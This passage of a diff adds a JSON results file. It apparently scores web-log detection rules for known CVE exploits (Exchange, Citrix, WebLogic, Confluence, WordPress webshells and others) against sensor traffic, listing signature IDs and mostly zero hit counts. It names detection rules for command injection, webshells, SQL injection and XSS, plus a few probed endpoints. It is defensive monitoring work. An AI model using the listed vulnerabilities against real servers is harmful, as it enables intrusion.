+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-33891/web_cve_2022_33891_spark_shell_command_injection.yml",
+   "title": "Apache Spark Shell Command Injection - Weblogs",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2022-33891-spark-shell-command"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-36804/web_cve_2022_36804_atlassian_bitbucket_command_injection.yml",
+   "title": "Atlassian Bitbucket Command Injection Via Archive API",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2022-36804-atlassian-bitbucket"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-41082/web_cve_2022_36804_exchange_owassrf_exploitation.yml",
+   "title": "Potential OWASSRF Exploitation Attempt - Webserver",
+   "pure": false,
+   "signatures": [
+    "sg-cve-2022-36804-exchange-owassrf"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-44877/web_cve_2022_44877_exploitation_attempt.yml",
+   "title": "Potential Centos Web Panel Exploitation Attempt - CVE-2022-44877",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2022-44877-exploitation-attempt"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-46169/web_cve_2022_46169_cacti_exploitation_attempt.yml",
+   "title": "Potential CVE-2022-46169 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2022-46169-cacti-exploitation"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-22518/web_exploit_cve_2023_22518_confluence_auth_bypass.yml",
+   "title": "CVE-2023-22518 Exploitation Attempt - Vulnerable Endpoint Connection (Webserver)",
+   "pure": true,
+   "signatures": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "selected": true,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-23752/web_cve_2023_23752_joomla_exploit_attempt.yml",
+   "title": "Potential CVE-2023-23752 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2023-23752-joomla-exploit-attempt"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-25157/web_cve_2023_25157_geoserver_sql_injection.yml",
+   "title": "Potential CVE-2023-25157 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2023-25157-geoserver-sql"
+   ],
+   "selected": true,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-25717/web_cve_2023_25717_ruckus_wireless_admin_exploit_attempt.yml",
+   "title": "Potential CVE-2023-25717 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2023-25717-ruckus-wireless-admin"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-27997/web_cve_2023_27997_pre_authentication_rce.yml",
+   "title": "Potential CVE-2023-27997 Exploitation Indicators",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2023-27997-pre-authentication-rce"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-34362-MOVEit-Transfer-Exploit/web_cve_2023_34362_known_payload_request.yml.yml",
+   "title": "MOVEit CVE-2023-34362 Exploitation Attempt - Potential Web Shell Request",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2023-34362-known-payload-request"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-43261/web_exploit_cve_2023_43261_milesight_information_disclosure.yml",
+   "title": "Potential Information Disclosure CVE-2023-43261 Exploitation - Web",
+   "pure": true,
+   "signatures": [
+    "sg-exploit-cve-2023-43261-milesight"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-46214/web_cve_2023_46214_rce_splunk_enterprise.yml",
+   "title": "Potential CVE-2023-46214 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2023-46214-rce-splunk-enterprise"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-46214/web_cve_2023_46214_rce_splunk_enterprise_poc.yml",
+   "title": "Exploitation Attempt Of CVE-2023-46214 Using Public POC Code",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2023-46214-rce-splunk-1",
+    "sg-cve-2023-46214-rce-splunk-2"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-46747/web_cve_2023_46747_f5_remote_code_execution.yml",
+   "title": "CVE-2023-46747 Exploitation Activity - Webserver",
+   "pure": false,
+   "signatures": [
+    "sg-cve-2023-46747-f5-remote-code-1",
+    "sg-cve-2023-46747-f5-remote-code-2"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-4966/web_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit.yml",
+   "title": "CVE-2023-4966 Potential Exploitation Attempt - Citrix ADC Sensitive Information Disclosure - Webserver",
+   "pure": true,
+   "signatures": [
+    "sg-exploit-cve-2023-4966-citrix"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2024/Exploits/CVE-2024-1212/web_exploit_cve_2024_1212_.yml",
+   "title": "CVE-2024-1212 Exploitation - Progress Kemp LoadMaster Unauthenticated Command Injection",
+   "pure": true,
+   "signatures": [
+    "sg-exploit-cve-2024-1212"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2024/Exploits/CVE-2024-1709/web_exploit_cve_2024_1709_screenconnect.yml",
+   "title": "CVE-2024-1709 - ScreenConnect Authentication Bypass Exploitation",
+   "pure": true,
+   "signatures": [
+    "sg-exploit-cve-2024-1709-screenconnect"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2025/Exploits/CVE-2025-31324/web_lnx_exploit_cve_2025_31324_sap_netviewer_webshell.yml",
+   "title": "Potential SAP NetViewer Webshell Command Execution",
+   "pure": true,
+   "signatures": [
+    "sg-lnx-exploit-cve-2025-31324-sap-1",
+    "sg-lnx-exploit-cve-2025-31324-sap-2",
+    "sg-lnx-exploit-cve-2025-31324-sap-3"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2025/Exploits/CVE-2025-4427/web_invanti_epmm_cve_2025_4427_and_cve_2025_4428.yml",
+   "title": "Potential Exploitation of CVE-2025-4427/4428 Ivanti EPMM Pre-Auth RCE",
+   "pure": true,
+   "signatures": [
+    "sg-invanti-epmm-cve-2025-4427-and-cve-1",
+    "sg-invanti-epmm-cve-2025-4427-and-cve-2",
+    "sg-invanti-epmm-cve-2025-4427-and-cve-3",
+    "sg-invanti-epmm-cve-2025-4427-and-cve-4"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2026/Exploits/CVE-2026-63030/web_exploit_cve_2026_63030_batch_rest_route_abuse.yml",
+   "title": "WordPress Wp2shell REST Batch Endpoint Exploitation",
+   "pure": true,
+   "signatures": [
+    "sg-exploit-cve-2026-63030-batch-rest"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2026/Exploits/CVE-2026-63030/web_exploit_cve_2026_63030_webshell_plugin_access.yml",
+   "title": "WordPress Wp2shell Webshell Plugin Access",
+   "pure": true,
+   "signatures": [
+    "sg-exploit-cve-2026-63030-webshell"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  }
+ ],
+ "sgx_pattern_only_hits": [
+  {
+   "signature": "sg-cve-2020-0688-msexchange",
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-0688/web_cve_2020_0688_msexchange.yml",
+   "stages": [
+    {
+     "stage": "pattern",
+     "real": 4,
+     "normal_marked": 0,
+     "urls": [
+      {
+       "method": "GET",
+       "url": "/owa/",
+       "status": 404,
+       "count": 4
+      }
+     ]
+    },
+    {
+     "stage": "+all_patterns",
+     "real": 0,
+     "normal_marked": 0,
+     "urls": []
+    },
+    {
+     "stage": "+methods",
+     "real": 0,
+     "normal_marked": 0,
+     "urls": []
+    }
+   ]
+  },
+  {
+   "signature": "sg-cve-2021-22893-pulse-secure-rce",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-22893/web_cve_2021_22893_pulse_secure_rce_exploit.yml",
+   "stages": [
+    {
+     "stage": "pattern",
+     "real": 2,
+     "normal_marked": 0,
+     "urls": [
+      {
+       "method": "GET",
+       "url": "/dana-cached/hc/HostCheckerInstaller.osx",
+       "status": 404,
+       "count": 2
+      }
+     ]
+    },
+    {
+     "stage": "+all_patterns",
+     "real": 0,
+     "normal_marked": 0,
+     "urls": []
+    }
+   ]
+  },
+  {
+   "signature": "sg-cve-2021-26858-iis-rce",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-26858/web_cve_2021_26858_iis_rce.yml",
+   "stages": [
+    {
+     "stage": "pattern",
+     "real": 1,
+     "normal_marked": 0,
+     "urls": [
+      {
+       "method": "GET",
+       "url": "/wp-content/plugins/post-smtp/readme.txt",
+       "status": 404,
+       "count": 1
+      }
+     ]
+    },
+    {
+     "stage": "+all_patterns",
+     "real": 0,
+     "normal_marked": 0,
+     "urls": []
+    }
+   ]
+  },
+  {
+   "signature": "sg-cve-2022-36804-exchange-owassrf",
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-41082/web_cve_2022_36804_exchange_owassrf_exploitation.yml",
+   "stages": [
+    {
+     "stage": "pattern",
+     "real": 4,
+     "normal_marked": 0,
+     "urls": [
+      {
+       "method": "GET",
+       "url": "/owa/",
+       "status": 404,
+       "count": 4
+      }
+     ]
+    },
+    {
+     "stage": "+all_patterns",
+     "real": 0,
+     "normal_marked": 0,
+     "urls": []
+    },
+    {
+     "stage": "+methods",
+     "real": 0,
+     "normal_marked": 0,
+     "urls": []
+    },
+    {
+     "stage": "+statuses",
+     "real": 0,
+     "normal_marked": 0,
+     "urls": []
+    }
+   ]
+  }
+ ],
+ "sgx_signatures": [
+  {
+   "signature": "sg-f5-tm-utility-bash-api-request",
+   "path": "rules/web/webserver_generic/web_f5_tm_utility_bash_api_request.yml",
+   "title": "F5 BIG-IP iControl Rest API Command Execution - Webserver",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-iis-tilt-shortname-scan",
+   "path": "rules/web/webserver_generic/web_iis_tilt_shortname_scan.yml",
+   "title": "Successful IIS Shortname Fuzzing Scan",
+   "pure": true,
+   "statuses": [
+    200,
+    301
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-java-payload-in-access-logs",
+   "path": "rules/web/webserver_generic/web_java_payload_in_access_logs.yml",
+   "title": "Java Payload Strings",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-jndi-exploit",
+   "path": "rules/web/webserver_generic/web_jndi_exploit.yml",
+   "title": "JNDIExploit Pattern",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-path-traversal-exploitation-attempt",
+   "path": "rules/web/webserver_generic/web_path_traversal_exploitation_attempt.yml",
+   "title": "Path Traversal Exploitation Attempts",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-source-code-enumeration",
+   "path": "rules/web/webserver_generic/web_source_code_enumeration.yml",
+   "title": "Source Code Enumeration Detection by Keyword",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-sql-injection-in-access-logs",
+   "path": "rules/web/webserver_generic/web_sql_injection_in_access_logs.yml",
+   "title": "SQL Injection Strings In URI",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-ssti-in-access-logs",
+   "path": "rules/web/webserver_generic/web_ssti_in_access_logs.yml",
+   "title": "Server Side Template Injection Strings",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-susp-windows-path-uri",
+   "path": "rules/web/webserver_generic/web_susp_windows_path_uri.yml",
+   "title": "Suspicious Windows Strings In URI",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-win-webshells-in-access-logs",
+   "path": "rules/web/webserver_generic/web_win_webshells_in_access_logs.yml",
+   "title": "Windows Webshell Strings",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-xss-in-access-logs",
+   "path": "rules/web/webserver_generic/web_xss_in_access_logs.yml",
+   "title": "Cross Site Scripting Strings",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2010-5278-exploitation-attempt",
+   "path": "rules-emerging-threats/2010/Exploits/CVE-2010-5278/web_cve_2010_5278_exploitation_attempt.yml",
+   "title": "CVE-2010-5278 Exploitation Attempt",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2014-6287-hfs-rce",
+   "path": "rules-emerging-threats/2014/Exploits/CVE-2014-6287/web_cve_2014_6287_hfs_rce.yml",
+   "title": "Rejetto HTTP File Server RCE",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2018-13379-fortinet-preauth-read",
+   "path": "rules-emerging-threats/2018/Exploits/CVE-2018-13379/web_cve_2018_13379_fortinet_preauth_read_exploit.yml",
+   "title": "Fortinet CVE-2018-13379 Exploitation",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2018-2894-weblogic-exploit",
+   "path": "rules-emerging-threats/2018/Exploits/CVE-2018-2894/web_cve_2018_2894_weblogic_exploit.yml",
+   "title": "Oracle WebLogic Exploit",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2019-11510-pulsesecure-exploit",
+   "path": "rules-emerging-threats/2019/Exploits/CVE-2019-11510/web_cve_2019_11510_pulsesecure_exploit.yml",
+   "title": "Pulse Secure Attack CVE-2019-11510",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2019-19781-citrix-exploit-1",
+   "path": "rules-emerging-threats/2019/Exploits/CVE-2019-19781/web_cve_2019_19781_citrix_exploit.yml",
+   "title": "Citrix Netscaler Attack CVE-2019-19781",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2019-19781-citrix-exploit-2",
+   "path": "rules-emerging-threats/2019/Exploits/CVE-2019-19781/web_cve_2019_19781_citrix_exploit.yml",
+   "title": "Citrix Netscaler Attack CVE-2019-19781",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2019-19781-citrix-exploit-3",
+   "path": "rules-emerging-threats/2019/Exploits/CVE-2019-19781/web_cve_2019_19781_citrix_exploit.yml",
+   "title": "Citrix Netscaler Attack CVE-2019-19781",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2019-3398-confluence",
+   "path": "rules-emerging-threats/2019/Exploits/CVE-2019-3398/web_cve_2019_3398_confluence.yml",
+   "title": "Confluence Exploitation CVE-2019-3398",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2020-0688-exchange-exploit",
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-0688/web_cve_2020_0688_exchange_exploit.yml",
+   "title": "CVE-2020-0688 Exploitation Attempt",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2020-0688-msexchange",
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-0688/web_cve_2020_0688_msexchange.yml",
+   "title": "CVE-2020-0688 Exchange Exploitation via Web Log",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2020-10148-solarwinds-exploit",
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-10148/web_cve_2020_10148_solarwinds_exploit.yml",
+   "title": "CVE-2020-10148 SolarWinds Orion API Auth Bypass",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2020-14882-weblogic-exploit",
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-14882/web_cve_2020_14882_weblogic_exploit.yml",
+   "title": "Oracle WebLogic Exploit CVE-2020-14882",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2020-28188-terramaster-rce",
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-28188/web_cve_2020_28188_terramaster_rce_exploit.yml",
+   "title": "TerraMaster TOS CVE-2020-28188",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2020-3452-cisco-asa-ftd",
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-3452/web_cve_2020_3452_cisco_asa_ftd.yml",
+   "title": "Cisco ASA FTD Exploit CVE-2020-3452",
+   "pure": true,
+   "statuses": [
+    200
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2020-5902-f5-bigip",
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-5902/web_cve_2020_5902_f5_bigip.yml",
+   "title": "CVE-2020-5902 F5 BIG-IP Exploitation Attempt",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2020-8193-8195-citrix-exploit-1",
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-8193/web_cve_2020_8193_8195_citrix_exploit.yml",
+   "title": "Citrix ADS Exploitation CVE-2020-8193 CVE-2020-8195",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2020-8193-8195-citrix-exploit-2",
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-8193/web_cve_2020_8193_8195_citrix_exploit.yml",
+   "title": "Citrix ADS Exploitation CVE-2020-8193 CVE-2020-8195",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-solarwinds-supernova-webshell-1",
+   "path": "rules-emerging-threats/2020/TA/SolarWinds-Supply-Chain/web_solarwinds_supernova_webshell.yml",
+   "title": "Solarwinds SUPERNOVA Webshell Access",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-solarwinds-supernova-webshell-2",
+   "path": "rules-emerging-threats/2020/TA/SolarWinds-Supply-Chain/web_solarwinds_supernova_webshell.yml",
+   "title": "Solarwinds SUPERNOVA Webshell Access",
+   "pure": true,
+   "statuses": [
+    500
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-20090-2021-20091-arcadyan-1",
